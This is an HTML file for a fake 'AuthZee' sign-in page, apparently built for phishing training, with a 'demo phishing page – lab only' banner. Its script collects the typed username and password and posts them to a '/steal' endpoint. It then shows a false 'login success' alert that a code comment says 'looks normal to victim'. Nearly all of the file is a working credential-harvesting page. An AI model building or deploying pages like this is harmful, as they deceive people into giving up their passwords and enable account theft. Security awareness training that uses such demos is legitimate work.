<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8" />
  <title>AuthZee – Sign in</title>
  <style>
    body {
      margin: 0;
      font-family: system-ui, sans-serif;
      background: radial-gradient(circle at top left,#0f172a 0%,#020617 45%,#111827 100%);
      color: #e5e7eb;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
    }
    .card {
      background: rgba(15,23,42,0.96);
      border-radius: 24px;
      padding: 28px 26px;
      width: 360px;
      border: 1px solid rgba(148,163,184,0.7);
      box-shadow: 0 24px 48px rgba(15,23,42,0.8);
    }
    h1 {
      text-align: center;
      margin: 0 0 6px;
      font-size: 24px;
    }
    .subtitle {
      text-align: center;
      font-size: 13px;
      opacity: 0.8;
      margin-bottom: 16px;
    }
    .danger {
      font-size: 10px;
      color: #fecaca;
      background: rgba(239,68,68,0.25);
      border-radius: 999px;
      padding: 4px 10px;
      text-align: center;
      margin-bottom: 10px;
    }
    label {
      display: block;
      font-size: 12px;
      margin-bottom: 4px;
    }
    input {
      width: 100%;
      padding: 9px 11px;
      border-radius: 999px;
      border: 1px solid rgba(148,163,184,0.7);
      background: rgba(15,23,42,0.95);
      color: #e5e7eb;
      font-size: 13px;
      margin-bottom: 10px;
    }
    button {
      width: 100%;
      padding: 11px 12px;
      border-radius: 999px;
      border: none;
      background: #4f46e5;
      color: white;
      font-size: 14px;
      font-weight: 600;
      cursor: pointer;
    }
    .note {
      margin-top: 8px;
      font-size: 11px;
      opacity: 0.75;
      text-align: center;
    }
  </style>
</head>
<body>
  <div class="card">
    <h1>Sign in to AuthZee</h1>
    <div class="subtitle">Enter your username and password to continue</div>
    <div class="danger">DEMO PHISHING PAGE – LAB ONLY</div>
    <form id="phishForm">
      <label for="username">Username</label>
      <input id="username" type="text" required placeholder="user" />
      <label for="password">Password</label>
      <input id="password" type="password" required placeholder="pass" />
      <button type="submit">Sign in</button>
    </form>
    <div class="note">
      This page sends your password to the server that is hosting it.
    </div>
  </div>

  <script>
    const form = document.getElementById('phishForm')
    const u = document.getElementById('username')
    const p = document.getElementById('password')

    form.addEventListener('submit', async (e) => {
      e.preventDefault()
      const username = u.value
      const password = p.value

      try {
        await fetch('/steal', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ username, password }),
        })
        alert('AuthZee login success!') // looks normal to victim
        u.value = ''
        p.value = ''
      } catch (err) {
        alert('Network error (demo)')
      }
    })
  </script>
</body>
</html>
